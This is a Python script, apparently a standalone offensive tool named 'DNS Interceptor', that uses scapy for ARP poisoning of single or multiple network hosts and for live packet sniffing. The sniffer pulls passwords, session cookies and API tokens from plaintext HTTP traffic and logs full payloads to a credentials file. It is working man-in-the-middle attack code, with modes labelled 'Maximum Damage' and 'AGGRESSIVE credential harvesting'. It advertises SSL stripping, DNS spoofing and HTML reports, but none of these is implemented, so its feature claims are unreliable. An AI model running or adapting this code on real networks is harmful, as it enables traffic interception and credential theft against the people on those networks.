#!/usr/bin/env python3
"""
DNS Interceptor - Professional Network Security Analysis Tool
===================================================

A comprehensive MITM (Man-in-the-Middle) framework for network security testing,
penetration testing, and traffic analysis. Built for cybersecurity professionals.

Features:
- ARP Spoofing & Network Discovery
- Advanced Packet Interception
- SSL/TLS Traffic Analysis
- Credential Harvesting
- DNS Monitoring & Spoofing
- PCAP Export for Wireshark/Zeek
- Memory Cache System
- Professional HTML Reporting

Author: Reza
Version: 2.0.0
License: MIT
"""

import scapy.all as scapy
import threading
import time
import datetime as dt
import argparse
import json
import csv
import pickle
import hashlib
from collections import defaultdict, Counter
import signal
import sys
import os

# Global advanced cache instance
advanced_cache = None

class AdvancedMemoryCache:
    """Advanced memory cache for comprehensive network traffic analysis"""
    
    def __init__(self):
        self.packets = []
        self.dns_queries = []
        self.credentials = []
        self.api_tokens = []
        self.cookies = []
        self.hosts = set()
        self.connections = []
        self.ssl_certificates = []
        self.suspicious_events = []
        
        # Statistics tracking
        self.statistics = {
            'packets_analyzed': 0,
            'passwords_found': 0,
            'dns_queries': 0,
            'cookies_captured': 0,
            'api_tokens_found': 0,
            'hosts_discovered': 0,
            'connections_tracked': 0,
            'suspicious_events': 0,
            'session_start': dt.datetime.now().isoformat()
        }
        
    def add_packet(self, packet, packet_type, metadata=None):
        """Add packet to cache with metadata"""
        packet_info = {
            'timestamp': dt.datetime.now().isoformat(),
            'type': packet_type,
            'metadata': metadata or {},
            'summary': packet.summary()
        }
        self.packets.append(packet_info)
        self.statistics['packets_analyzed'] += 1
        
    def add_dns_query(self, source_ip, domain, query_type='A'):
        """Add DNS query to cache"""
        dns_info = {
            'timestamp': dt.datetime.now().isoformat(),
            'source_ip': source_ip,
            'domain': domain,
            'query_type': query_type
        }
        self.dns_queries.append(dns_info)
        self.statistics['dns_queries'] += 1
        self.add_host(source_ip)
        
    def add_credential(self, source_ip, credential_type, context=None):
        """Add captured credential to cache"""
        cred_info = {
            'timestamp': dt.datetime.now().isoformat(),
            'source_ip': source_ip,
            'type': credential_type,
            'context': context or 'Unknown'
        }
        self.credentials.append(cred_info)
        self.statistics['passwords_found'] += 1
        self.add_host(source_ip)
        
    def add_api_token(self, source_ip, token_type, token_value, context=None):
        """Add API token/key to cache"""
        token_info = {
            'timestamp': dt.datetime.now().isoformat(),
            'source_ip': source_ip,
            'token_type': token_type,
            'token_value': token_value[:50] + "..." if len(str(token_value)) > 50 else str(token_value),
            'context': context or 'Unknown'
        }
        self.api_tokens.append(token_info)
        self.statistics['api_tokens_found'] += 1
        self.add_host(source_ip)
        
    def add_host(self, ip_address):
        """Add discovered host to cache"""
        if ip_address not in self.hosts:
            self.hosts.add(ip_address)
            self.statistics['hosts_discovered'] = len(self.hosts)
            
    def get_summary(self):
        """Get comprehensive summary of cached data"""
        session_duration = (dt.datetime.now() - dt.datetime.fromisoformat(self.statistics['session_start'])).total_seconds()
        
        # Top domains analysis
        domain_counter = Counter([q['domain'] for q in self.dns_queries])
        top_domains = domain_counter.most_common(10)
        
        # Active hosts
        active_hosts = list(self.hosts)[:20]
        
        # Credential sources
        credential_sources = {}
        for cred in self.credentials:
            ip = cred['source_ip']
            if ip not in credential_sources:
                credential_sources[ip] = []
            credential_sources[ip].append(cred['type'])
        
        return {
            'session_duration': f"{session_duration:.1f} seconds",
            'statistics': self.statistics,
            'top_domains': top_domains,
            'active_hosts': active_hosts,
            'credential_sources': credential_sources
        }
        
    def export_to_files(self, base_filename):
        """Export all cached data to multiple file formats"""
        timestamp = dt.datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Export DNS queries to CSV
        dns_file = f"{base_filename}_dns_{timestamp}.csv"
        with open(dns_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Timestamp', 'Source_IP', 'Domain', 'Query_Type'])
            for dns in self.dns_queries:
                writer.writerow([dns['timestamp'], dns['source_ip'], dns['domain'], dns['query_type']])
        
        # Export credentials to JSON
        creds_file = f"{base_filename}_credentials_{timestamp}.json"
        with open(creds_file, 'w') as f:
            json.dump(self.credentials, f, indent=2)
            
        # Export hosts to JSON
        hosts_file = f"{base_filename}_hosts_{timestamp}.json"
        with open(hosts_file, 'w') as f:
            json.dump({
                'discovered_hosts': list(self.hosts),
                'total_count': len(self.hosts),
                'timestamp': timestamp
            }, f, indent=2)
            
        # Export summary to text
        summary_file = f"{base_filename}_summary_{timestamp}.txt"
        with open(summary_file, 'w') as f:
            summary = self.get_summary()
            f.write("DNS Interceptor - Session Summary\n")
            f.write("=" * 40 + "\n\n")
            f.write(f"Session Duration: {summary['session_duration']}\n\n")
            f.write("Statistics:\n")
            for key, value in summary['statistics'].items():
                f.write(f"  {key}: {value}\n")
            f.write(f"\nTop Domains ({len(summary['top_domains'])}):\n")
            for domain, count in summary['top_domains']:
                f.write(f"  {domain}: {count} queries\n")
            f.write(f"\nActive Hosts ({len(summary['active_hosts'])}):\n")
            for host in summary['active_hosts']:
                f.write(f"  {host}\n")
                
        return [dns_file, creds_file, hosts_file, summary_file]

def signal_handler(sig, frame):
    """Graceful shutdown handler"""
    global advanced_cache
    print("\n🛑 [SHUTDOWN] Graceful termination initiated...")
    
    if advanced_cache:
        print("💾 [EXPORT] Auto-exporting session data...")
        try:
            files = advanced_cache.export_to_files('session_export')
            print(f"✅ [SAVED] Session data exported to {len(files)} files")
            
            summary = advanced_cache.get_summary()
            print(f"📊 [SUMMARY] {summary['session_duration']} | "
                  f"Packets: {summary['statistics']['packets_analyzed']} | "
                  f"DNS: {summary['statistics']['dns_queries']} | "
                  f"Passwords: {summary['statistics']['passwords_found']}")
        except Exception as e:
            print(f"❌ [ERROR] Export failed: {e}")
    
    print("🔥 [COMPLETE] DNS Interceptor terminated")
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def get_local_ip():
    """Get local IP address"""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

def get_default_interface():
    """Get default network interface"""
    try:
        # Get default route interface
        import subprocess
        result = subprocess.run(['ip', 'route', 'show', 'default'], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            lines = result.stdout.strip().split('\n')
            for line in lines:
                if 'dev' in line:
                    parts = line.split()
                    dev_index = parts.index('dev') + 1
                    if dev_index < len(parts):
                        return parts[dev_index]
        return "eth0"  # fallback
    except:
        return "eth0"

def network_discovery(interface):
    """Advanced network discovery using ARP sweep"""
    print("🔍 [DISCOVERY] Advanced network reconnaissance...")
    print("🎯 [ARP-SWEEP] Scanning local network...")
    
    local_ip = get_local_ip()
    network = ".".join(local_ip.split(".")[:-1]) + ".0/24"
    
    print(f"🌐 [NETWORK] Scanning: {network}")
    print(f"🖥️  [LOCAL-IP] Your IP: {local_ip}")
    
    # Create ARP request for network range
    arp_request = scapy.ARP(pdst=network)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    try:
        answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
        
        print(f"\n📡 [RESULTS] Discovered {len(answered_list)} active hosts:")
        print(f"{'IP Address':<15} {'MAC Address':<18} {'Status'}")
        print("-" * 50)
        
        for element in answered_list:
            ip = element[1].psrc
            mac = element[1].hwsrc
            status = "🟢 ACTIVE"
            print(f"{ip:<15} {mac:<18} {status}")
            
            global advanced_cache
            if advanced_cache:
                advanced_cache.add_host(ip)
        
        if len(answered_list) == 0:
            print("⚠️  [WARNING] No hosts discovered. Check network connectivity.")
            
    except Exception as e:
        print(f"❌ [ERROR] Network discovery failed: {e}")

def arp_spoof(target_ip, gateway_ip, interface):
    """Continuous ARP spoofing attack"""
    print(f"💀 [ARP-SPOOF] Target: {target_ip} | Gateway: {gateway_ip}")
    
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        
        if not target_mac:
            print(f"❌ [ERROR] Could not resolve MAC for {target_ip}")
            return
        if not gateway_mac:
            print(f"❌ [ERROR] Could not resolve MAC for {gateway_ip}")
            return
            
        print(f"🎯 [TARGET] {target_ip} ({target_mac})")
        print(f"🚪 [GATEWAY] {gateway_ip} ({gateway_mac})")
        print("🔄 [ACTIVE] ARP poisoning in progress...")
        
        packet_count = 0
        while True:
            # Send ARP reply to target (telling target that we are the gateway)
            scapy.sendp(scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), 
                       iface=interface, verbose=False)
            
            # Send ARP reply to gateway (telling gateway that we are the target)
            scapy.sendp(scapy.Ether(dst=gateway_mac) / scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), 
                       iface=interface, verbose=False)
            
            packet_count += 2
            if packet_count % 20 == 0:
                print(f"📤 [SENT] {packet_count} ARP packets")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n🛑 [STOPPED] ARP spoofing terminated")
        print("🔄 [RESTORE] Restoring network...")
        restore_network(target_ip, gateway_ip, interface)

def get_mac(ip):
    """Get MAC address for IP"""
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    except:
        return None

def restore_network(target_ip, gateway_ip, interface):
    """Restore network by sending correct ARP packets"""
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        
        if target_mac and gateway_mac:
            # Restore target's ARP table
            scapy.sendp(scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), 
                       iface=interface, count=5, verbose=False)
            
            # Restore gateway's ARP table  
            scapy.sendp(scapy.Ether(dst=gateway_mac) / scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), 
                       iface=interface, count=5, verbose=False)
            
            print("✅ [RESTORED] Network tables restored")
        print("[*] Network should recover in ~60 seconds")
    except:
        print("[*] Network should recover in ~60 seconds")

def start_packet_intercept(interface, save_pcap=None):
    """Advanced packet interception with PCAP export and memory cache"""
    print("👁️  [INTERCEPT] Advanced packet analysis with caching...")
    print("🔍 [HUNTING] Credentials, tokens, cookies, files...")
    print("🎯 [SSL/TLS] Capturing encrypted traffic...")
    print("💀 [DOWNGRADE] HTTP/HTTPS analysis active...")
    print("🔓 [BRUTEFORCE] Password harvesting enabled...")
    
    if save_pcap:
        print(f"💾 [PCAP] Saving packets to: {save_pcap}")
        pcap_writer = scapy.PcapWriter(save_pcap, append=True)
    else:
        pcap_writer = None
    
    def advanced_packet_handler(pkt):
        global advanced_cache
        timestamp = dt.datetime.now().strftime('%H:%M:%S')
        
        # Save to PCAP if requested
        if pcap_writer:
            pcap_writer.write(pkt)
        
        # Add to memory cache
        packet_metadata = {
            'interface': interface,
            'timestamp': timestamp
        }
        
        if pkt.haslayer(scapy.IP):
            packet_metadata['src_ip'] = pkt[scapy.IP].src
            packet_metadata['dst_ip'] = pkt[scapy.IP].dst
        
        advanced_cache.add_packet(pkt, 'intercepted', packet_metadata)
        
        # HTTPS/TLS Traffic Analysis (Port 443)
        if pkt.haslayer(scapy.TCP):
            src_ip = pkt[scapy.IP].src if pkt.haslayer(scapy.IP) else "Unknown"
            dst_ip = pkt[scapy.IP].dst if pkt.haslayer(scapy.IP) else "Unknown"
            sport = pkt[scapy.TCP].sport
            dport = pkt[scapy.TCP].dport
            
            # Add host discovery
            advanced_cache.add_host(src_ip)
            if dst_ip != src_ip:
                advanced_cache.add_host(dst_ip)
            
            # HTTPS Traffic Detection
            if dport == 443 or sport == 443:
                if pkt.haslayer(scapy.Raw):
                    payload = bytes(pkt[scapy.Raw].load)
                    # SSL/TLS Handshake Detection
                    if len(payload) > 5 and payload[0:3] == b'\x16\x03':
                        print(f"🔒 [{timestamp}] SSL HANDSHAKE: {src_ip} → {dst_ip}")
                        
                        # Add to cache
                        advanced_cache.add_api_token(src_ip, 'SSL_HANDSHAKE', dst_ip, 
                                                   f"TLS connection to {dst_ip}")
                        
                        # Try to extract SNI (Server Name)
                        try:
                            if b'\x00\x00' in payload[5:]:
                                parts = payload[5:].split(b'\x00\x00')
                                for part in parts:
                                    if b'.' in part and 3 < len(part) < 100:
                                        domain = part.decode('utf-8', errors='ignore')
                                        if '.' in domain and ' ' not in domain:
                                            print(f"    🌐 SNI: {domain[:50]}")
                                            advanced_cache.add_dns_query(src_ip, domain, 'SNI')
                                            break
                        except:
                            pass
        
        # HTTP Traffic Analysis
        if pkt.haslayer(scapy.Raw) and pkt.haslayer(scapy.TCP):
            try:
                payload = pkt[scapy.Raw].load.decode('utf-8', errors='ignore')
                src_ip = pkt[scapy.IP].src
                dst_ip = pkt[scapy.IP].dst
                sport = pkt[scapy.TCP].sport
                dport = pkt[scapy.TCP].dport
                
                # Enhanced Password Detection
                password_patterns = [
                    'password=', 'passwd=', 'pwd=', 'pass=', 'login=', 'user=', 'username=',
                    'email=', 'token=', 'key=', 'admin=', 'root=', 'auth=', 'credential=',
                    'secret=', 'api_key=', 'access_token=', 'session='
                ]
                
                for pattern in password_patterns:
                    if pattern in payload.lower():
                        print(f"🔓 [{timestamp}] *** CREDENTIAL CAPTURED! ***")
                        print(f"    🎯 Source: {src_ip}:{sport}")
                        print(f"    🎯 Target: {dst_ip}:{dport}")
                        print(f"    🔑 Pattern: {pattern.upper()}")
                        print(f"    📄 Data: {payload[:200]}...")
                        print(f"    {'='*60}")
                        
                        # Add to cache
                        advanced_cache.add_credential(
                            src_ip, pattern, 
                            context=f"HTTP traffic to {dst_ip}:{dport}"
                        )
                        
                        # Enhanced logging
                        with open("captured_credentials.txt", "a") as f:
                            f.write(f"[{timestamp}] *** CREDENTIAL FOUND ***\n")
                            f.write(f"Source: {src_ip}:{sport} → Target: {dst_ip}:{dport}\n")
                            f.write(f"Pattern: {pattern}\n")
                            f.write(f"Full Payload:\n{payload}\n")
                            f.write(f"{'='*80}\n\n")
                        break
                
                # Cookie/Session Token Detection
                if 'cookie:' in payload.lower() or 'set-cookie:' in payload.lower():
                    print(f"🍪 [{timestamp}] SESSION TOKEN: {src_ip}")
                    advanced_cache.add_api_token(src_ip, 'COOKIE', 'session_cookie',
                                                f"HTTP session to {dst_ip}")
                    
                # API Keys/Tokens
                if any(token in payload.lower() for token in ['api_key', 'access_token', 'bearer ', 'jwt']):
                    print(f"🔑 [{timestamp}] API TOKEN: {src_ip} → {dst_ip}")
                    advanced_cache.add_api_token(src_ip, 'API_TOKEN', 'detected',
                                                f"API call to {dst_ip}")
                    
            except Exception:
                pass
                
        # DNS Traffic Analysis
        elif pkt.haslayer(scapy.DNS) and pkt[scapy.DNS].qr == 0:
            try:
                domain = pkt[scapy.DNS].qd.qname.decode('utf-8').rstrip('.')
                src_ip = pkt[scapy.IP].src
                
                # Add to cache
                advanced_cache.add_dns_query(src_ip, domain)
                
                # Suspicious domains
                suspicious = ['torrent', 'porn', 'hack', 'crack', 'warez']
                if any(word in domain.lower() for word in suspicious):
                    print(f"⚠️  [{timestamp}] SUSPICIOUS: {src_ip} → {domain}")
                else:
                    print(f"🌐 [{timestamp}] DNS: {src_ip} → {domain}")
                    
                # Save DNS log
                with open("dns_queries.txt", "a") as f:
                    f.write(f"[{timestamp}] {src_ip} → {domain}\n")
                    
            except Exception:
                pass
        
        # Print stats every 50 packets
        if advanced_cache.statistics['packets_analyzed'] % 50 == 0:
            stats = advanced_cache.statistics
            print(f"\n📊 [STATS] Packets: {stats['packets_analyzed']} | Passwords: {stats['passwords_found']} | DNS: {stats['dns_queries']} | Tokens: {stats['api_tokens_found']}\n")
    
    try:
        print("🚀 [LIVE] Advanced packet interception active...")
        print("💾 [CACHE] Memory caching enabled...")
        scapy.sniff(iface=interface, prn=advanced_packet_handler, store=False, filter="tcp or udp")
    except KeyboardInterrupt:
        if pcap_writer:
            pcap_writer.close()
            print(f"✅ [PCAP] Saved to: {save_pcap}")
        
        print(f"\n📈 [FINAL STATS]")
        stats = advanced_cache.statistics
        for key, value in stats.items():
            print(f"    💀 {key}: {value}")
        print(f"🔥 [COMPLETE] Advanced interception terminated")

def mass_arp_attack(interface):
    """Mass ARP attack against all discovered hosts"""
    print("💥 [MASS-ATTACK] Network-wide ARP poisoning initiated...")
    print("⚠️  [DANGER] This will affect ALL network hosts!")
    
    # First discover network hosts
    local_ip = get_local_ip()
    network = ".".join(local_ip.split(".")[:-1]) + ".0/24"
    gateway_ip = ".".join(local_ip.split(".")[:-1]) + ".1"
    
    print(f"🔍 [SCANNING] Network: {network}")
    
    # Get active hosts
    arp_request = scapy.ARP(pdst=network)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    try:
        answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
        targets = [element[1].psrc for element in answered_list if element[1].psrc != local_ip]
        
        print(f"🎯 [TARGETS] Found {len(targets)} hosts to attack")
        
        if len(targets) == 0:
            print("❌ [ERROR] No targets found!")
            return
            
        # Start ARP spoofing threads for each target
        threads = []
        for target in targets[:10]:  # Limit to 10 targets to avoid system overload
            thread = threading.Thread(target=arp_spoof, args=(target, gateway_ip, interface))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            print(f"🚀 [LAUNCHED] Attack thread for {target}")
        
        print(f"💀 [ACTIVE] {len(threads)} attack threads running")
        print("Press Ctrl+C to stop all attacks...")
        
        # Keep main thread alive
        while True:
            time.sleep(5)
            print(f"💥 [STATUS] {len([t for t in threads if t.is_alive()])} attacks active")
            
    except KeyboardInterrupt:
        print("\n🛑 [STOPPING] Mass attack terminated")

def start_dns_monitoring():
    """Basic DNS monitoring mode"""
    print("📡 [DNS-MONITOR] Starting DNS query monitoring...")
    print("🌐 [LISTENING] Capturing DNS traffic...")
    
    def dns_packet_handler(pkt):
        if pkt.haslayer(scapy.DNS) and pkt[scapy.DNS].qr == 0:
            try:
                domain = pkt[scapy.DNS].qd.qname.decode('utf-8').rstrip('.')
                src_ip = pkt[scapy.IP].src
                timestamp = dt.datetime.now().strftime('%H:%M:%S')
                
                print(f"🌐 [{timestamp}] {src_ip} → {domain}")
                
                # Save to file
                with open("dns_queries.txt", "a") as f:
                    f.write(f"[{timestamp}] {src_ip} → {domain}\n")
                    
            except Exception:
                pass
    
    try:
        scapy.sniff(filter="udp port 53", prn=dns_packet_handler, store=False)
    except KeyboardInterrupt:
        print("\n🛑 [STOPPED] DNS monitoring terminated")

def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="DNS Interceptor - Professional Network Security Analysis Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 dns_interceptor.py -i eth0 --discovery-only
  sudo python3 dns_interceptor.py -i eth0 -t 192.168.1.100 -g 192.168.1.1 --attack
  sudo python3 dns_interceptor.py -i eth0 --intercept-only --save-pcap capture.pcap
  sudo python3 dns_interceptor.py -i eth0 --ultimate-mode -t 192.168.1.100 -g 192.168.1.1
        """
    )
    
    # Required arguments
    parser.add_argument(
        '-i', '--interface', required=True,
        help="Network interface to use (e.g., eth0, wlan0)"
    )
    
    # Target specification
    parser.add_argument(
        '-t', '--target-ip',
        help="Target IP address for attacks"
    )
    parser.add_argument(
        '-g', '--gateway-ip', 
        help="Gateway IP address (router)"
    )
    
    # Operation modes
    parser.add_argument(
        '--discovery-only', action='store_true',
        help="🔍 Only perform network discovery (safe mode)"
    )
    parser.add_argument(
        '--attack', '--enable-attack-mode', action='store_true',
        help="⚠️  Enable ARP spoofing attack mode"
    )
    parser.add_argument(
        '--mass-attack', action='store_true', 
        help="💥 DANGER: Mass ARP attack against all hosts"
    )
    parser.add_argument(
        '--intercept-only', action='store_true',
        help="👁️  Only intercept packets (no ARP attack)"
    )
    parser.add_argument(
        '--ultimate-mode', action='store_true',
        help="💀 ULTIMATE: ARP Attack + Packet Interception"
    )
    parser.add_argument(
        '--credential-harvest', action='store_true',
        help="🔓 AGGRESSIVE credential harvesting mode"
    )
    
    # Output options
    parser.add_argument(
        '--save-pcap', metavar='FILENAME',
        help="💾 Save captured packets to PCAP file for Wireshark/Zeek analysis"
    )
    parser.add_argument(
        '--export-cache', action='store_true',
        help="📊 Export memory cache to files (JSON, CSV, TXT)"
    )
    parser.add_argument(
        '--generate-report', action='store_true',
        help="📄 Generate professional HTML report"
    )
    
    return parser.parse_args()

def main():
    """Main execution function"""
    global advanced_cache
    
    # Initialize advanced cache
    advanced_cache = AdvancedMemoryCache()
    
    # Banner
    print("="*70)
    print("🔥 DNS Interceptor v2.0.0 - Professional Network Security Tool 🔥")
    print("="*70)
    print("⚡ Advanced MITM Framework for Cybersecurity Professionals")
    print("🎯 ARP Spoofing | Packet Analysis | Credential Harvesting")
    print("💀 SSL Strip | DNS Spoofing | PCAP Export | Memory Cache")
    print("="*70)
    
    args = parse_args()
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("❌ [ERROR] Root privileges required!")
        print("💡 [TIP] Run with: sudo python3 dns_interceptor.py")
        return
        
    print(f"🌐 [INTERFACE] Using: {args.interface}")
    print(f"🖥️  [LOCAL-IP] Your IP: {get_local_ip()}")
    
    # Execute based on mode
    if args.discovery_only:
        print("🔍 [SAFE-MODE] Network Discovery Only")
        network_discovery(args.interface)
        
    elif args.intercept_only:
        print("👁️  [PASSIVE] Packet Interception Only")
        pcap_file = args.save_pcap if args.save_pcap else None
        start_packet_intercept(args.interface, pcap_file)
        
    elif args.ultimate_mode:
        if not args.target_ip or not args.gateway_ip:
            print("❌ [ERROR] Ultimate mode requires -t and -g arguments")
            return
        print("💀 [ULTIMATE] Maximum Damage Mode Activated")
        
        # Start ARP spoofing in background
        arp_thread = threading.Thread(target=arp_spoof, args=(args.target_ip, args.gateway_ip, args.interface))
        arp_thread.daemon = True
        arp_thread.start()
        
        # Start packet interception
        pcap_file = "ultimate_mode.pcap" if args.save_pcap else None
        start_packet_intercept(args.interface, pcap_file)
        
    elif args.credential_harvest:
        print("🔓 [HARVEST] Aggressive Credential Hunting")
        pcap_file = args.save_pcap if args.save_pcap else None
        start_packet_intercept(args.interface, pcap_file)
        
    elif args.mass_attack:
        print("💥 [MASS] Network-Wide Attack Mode")
        mass_arp_attack(args.interface)
        
    elif args.attack:
        if not args.target_ip or not args.gateway_ip:
            print("❌ [ERROR] Attack mode requires -t and -g arguments")
            return
        print("⚠️  [SINGLE] Target Attack Mode")
        arp_spoof(args.target_ip, args.gateway_ip, args.interface)
        
    else:
        print("📡 [MONITOR] DNS Monitoring Mode")
        start_dns_monitoring()
        
    # Export cache if requested
    if args.export_cache:
        print(f"💾 [EXPORT] Exporting memory cache...")
        cache_summary = advanced_cache.get_summary()
        advanced_cache.export_to_files('cache_export')
        print(f"✅ [SAVED] Cache exported to cache_export_* files")
        print(f"📊 [SUMMARY] {cache_summary}")

if __name__ == "__main__":
    main()
